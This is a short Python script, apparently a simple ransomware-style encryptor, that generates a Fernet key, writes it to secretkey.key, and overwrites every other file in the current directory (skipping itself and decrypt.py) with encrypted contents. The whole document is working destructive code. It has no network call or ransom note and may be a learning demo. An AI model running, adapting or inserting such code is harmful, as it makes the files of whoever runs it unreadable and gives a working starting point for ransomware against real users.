#!/usr/bin/env python3
#Ephraim James

import os
from cryptography.fernet import Fernet


files = []
secret="secretkey.key"
for file in os.listdir():
    if file == "encrypt.py" or file == secret or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
 
 
key=Fernet.generate_key()
with open(secret,"wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents=thefile.read()
    content_encrypted=Fernet(key).encrypt(contents)

    with open(file,"wb") as thefile:
        thefile.write(content_encrypted)

 
     